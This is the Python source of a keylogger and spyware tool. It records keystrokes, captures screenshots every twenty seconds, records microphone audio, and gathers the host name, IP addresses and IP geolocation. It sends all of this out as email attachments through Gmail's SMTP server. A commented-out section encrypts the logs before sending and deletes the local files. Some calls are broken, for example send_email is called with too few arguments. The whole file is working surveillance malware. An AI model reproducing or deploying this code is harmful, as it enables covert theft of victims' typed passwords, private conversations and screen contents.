from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
from requests import get
import platform
from urllib.request import urlopen
import sys
from PIL import ImageGrab
from scipy.io.wavfile import write
import sounddevice
import time
import os
from cryptography.fernet import Fernet
from multiprocessing import Process
import zipfile
import datetime

keys = []
count = 0
mictime = 2
date = datetime.datetime.now()
fdate = date.strftime('%d/%m/%Y %H:%M')
iterationsn = 0
iterationstime = 30
iterationsend = 10

currenttime = time.time()
stop = time.time() + iterationstime

key_encrypt = 'GOppC9FI4qmM1d8hlH9o5BzjoFFsROD4PCsfLfsabvQ='

path = ''
syspath = ''
imagepath = ''
micpath = ''


def send_email(path,filename,subject):
    body_email = """
    """
    msg = MIMEMultipart()
    msg['Subject'] = 'Log'
    msg['From'] = ''
    msg['To'] = ''
    password = ''

    msg.attach(MIMEText(body_email, 'plain'))
    attachment = open(path, 'rb')
    print(attachment)

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    server.quit()
#send_email(path,"log.txt")

def pc_info():
    with open(syspath, 'a') as file:
        host = socket.gethostname()
        ip = socket.gethostbyname(host)
        try:
            publicip = get("https://api.ipify.org").text
            file.write("Public IP: " + publicip + "\n")
        except:
            file.write("Couldn't not find public ip.")
        file.write("Private IP: " + ip + "\n")
        file.write("Host: " + host + "\n")
        file.write("OS: "+ platform.system() + " " + platform.version() + "\n")
        try:
            if publicip:
                url = ("http://ip-api.com/json/" + publicip)
                request = urlopen(url)
                data = request.read().decode()
                data = eval(data)
                for info in data:
                    file.write(f"{info} == {data[info]}\n")
        except Exception as error:
            file.write("Couldn't not find ip location.")
#pc_info()

def print_screen():
    while True:
            print = ImageGrab.grab()
            print.save(imagepath)
            send_email(imagepath, "printscreen.png",'ImageLog')
            time.sleep(20) 
#print_screen()

def audio_collect():
    i = 0
    while True:
        f = 44100
        sec = mictime
        if i < 20:
            rec = sounddevice.rec(int(f * sec), samplerate=f,channels=2)
            sounddevice.wait()
            write(micpath,f,rec)
        else:
            send_email(micpath,"mic.zip")

#audio_collect()

if __name__ == "__main__":
    process1 = Process(target=audio_collect)
    process1.start()
    process2 = Process(target=print_screen)
    process2.start()

    while iterationsn < iterationsend:
        def on_press(key):
            global keys, count, currenttime
            print(key)
            key = str(key).replace("'", "")
            key = str(key).replace("Key.space", " ")
            key = str(key).replace("Key.enter", "\n")
            key = str(key).replace("Key.caps_lock", " CAPS ")
            key = str(key).replace("_r", "")
            key = str(key).replace("ç", "c,")
            keys.append(key) 
            count = 1
            currenttime = time.time()
            if count >= 1:
                count = 0
                write_file(keys)
                keys = []

        def write_file(keys):
            with open(path, 'a') as file: 
                for key in keys:
                    if key.find("Key"):
                        file.write(key)

        def on_release(key):
            if key == "Key.esc":
                return False
            if currenttime > stop:
                return False
        

        with Listener(on_press = on_press, on_release=on_release) as listener: 
            listener.join()
        
    if currenttime > stop:
        send_email(path, 'Log.txt')
        """
        with open(path,'w') as file:
            file.write(" ")
                #print_screen()
                #send_email(imagepath, "printscreen.png")
                #audio_collect()
                #send_email(micpath,"mic.wav")
            iterationsn += 1
            currenttime = time.time()
            stop = time.time() + iterationstime

        to_encrypt = [path,syspath]
        encrypted = [path,syspath]

        for x in to_encrypt:
            with open(x, 'rb') as file:
                file_contents = file.read()
            encrypt = Fernet(key_encrypt).encrypt(file_contents)
            with open(x, "wb") as file:
                file.write(encrypt)
            send_email(x, "loginformation.txt")
        time.sleep(60)
    """
    
        #delete = [syspath, path, zipimagem, zipmic]
        #for x in delete:
        #    os.remove(x)
    process1.join()
    process2.join()
